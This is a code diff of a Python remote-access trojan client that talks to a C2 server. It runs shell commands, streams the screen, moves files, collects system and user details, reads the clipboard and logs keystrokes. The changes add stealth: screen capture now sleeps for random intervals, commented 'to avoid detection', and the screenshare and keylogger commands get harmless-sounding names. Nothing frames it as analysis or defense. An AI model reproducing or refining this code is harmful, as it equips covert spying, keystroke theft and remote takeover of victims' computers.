@@ -3,39 +3,39 @@ import os
 import subprocess
 import pyautogui
 import time
-import shutil
-import ctypes
 import platform
 import getpass
 import clipboard
 from pynput import keyboard
+import random
 
-# Global variable to store key logs
+# Global variables
 key_logs = []
 key_logging = False
 
-def send_screenshare(client_socket):
-    """Capture and send screen to the C2 server."""
+# Function for remote control
+def execute_command(command):
+    """Execute a shell command."""
+    result = subprocess.getoutput(command)
+    return result
+
+# Stealthy Screen Capture
+def stealthy_screenshare(client_socket):
+    """Capture and send screen to the C2 server with randomized intervals."""
     try:
         while True:
             screenshot = pyautogui.screenshot()
             screenshot_bytes = screenshot.tobytes()
             client_socket.sendall(screenshot_bytes)
-            time.sleep(0.1)  # Adjust frame rate if needed
+            time.sleep(random.uniform(0.1, 0.5))  # Randomize sleep time to avoid detection
     except Exception as e:
         print(f"[!] Error during screenshare: {e}")
-
-def execute_command(command):
-    """Execute a shell command."""
-    result = subprocess.getoutput(command)
-    return result
 
 def get_pc_info():
     """Retrieve system information."""
     info = {
         "OS": platform.system(),
         "OS Version": platform.version(),
-        "OS Release": platform.release(),
         "Architecture": platform.architecture(),
         "Machine": platform.machine(),
         "Processor": platform.processor(),
@@ -58,7 +58,7 @@ def get_clipboard_content():
         return f"Error accessing clipboard: {e}"
 
 def start_keylogger():
-    """Start key logging."""
+    """Start key logging with a temporary buffer."""
     global key_logging, key_logs
     key_logging = True
     key_logs = []
@@ -73,10 +73,8 @@ def start_keylogger():
             elif hasattr(key, 'char') and key.char:  # Only capture printable characters
                 key_logs.append(key.char)
         except AttributeError:
-            # Ignore special keys like caps lock, num lock, etc.
             pass
 
-    # Start listener in a separate thread
     listener = keyboard.Listener(on_press=on_press)
     listener.start()
 
@@ -103,8 +101,8 @@ def client_loop(server_ip, server_port):
                 print("[*] Exiting...")
                 client.close()
                 break
-            elif command.lower() == "screenshare":
-                send_screenshare(client)
+            elif command.lower() == "viewstatus":  # Renamed from 'screenshare'
+                stealthy_screenshare(client)
             elif command.lower().startswith("upload"):
                 _, file_path, *dest = command.split()
                 if os.path.exists(file_path):
@@ -114,35 +112,31 @@ def client_loop(server_ip, server_port):
                 _, file_path = command.split()
                 with open(file_path, 'wb') as f:
                     f.write(client.recv(4096))
-            elif command.lower().startswith("kill"):
-                _, pid = command.split()
-                os.kill(int(pid), 9)
             elif command.lower() == "pcinfo":
                 client.send(get_pc_info().encode())
             elif command.lower() == "identify":
                 client.send(get_user_info().encode())
             elif command.lower() == "clipboard":
                 client.send(get_clipboard_content().encode())
-            elif command.lower() == "keymon set on":
+            elif command.lower() == "monitor set on":  # Renamed from 'keymon'
                 start_keylogger()
                 client.send(b"Keylogger started.")
-            elif command.lower() == "keymon set off":
+            elif command.lower() == "monitor set off":
                 stop_keylogger()
                 client.send(b"Keylogger stopped.")
-            elif command.lower() == "keymon dump":
+            elif command.lower() == "monitor dump":  # Renamed from 'keymon dump'
                 client.send(dump_keylogs().encode())
             elif command.lower() == "help":
                 help_text = """
 Available Commands:
 - upload <filename> -d <destination>: Upload a file to the client.
 - download <filename>: Download a file from the client.
-- kill <pid>: Kill a process by its PID.
 - pcinfo: Get system information.
 - identify: Get current user and domain.
 - clipboard: View clipboard content.
-- keymon set on: Start keylogger monitoring.
-- keymon set off: Stop keylogger monitoring.
-- keymon dump: Dump key logs.
+- monitor set on: Start keylogger monitoring.
+- monitor set off: Stop keylogger monitoring.
+- monitor dump: Dump key logs.
 - help: Show this help text.
 """
                 client.send(help_text.encode())
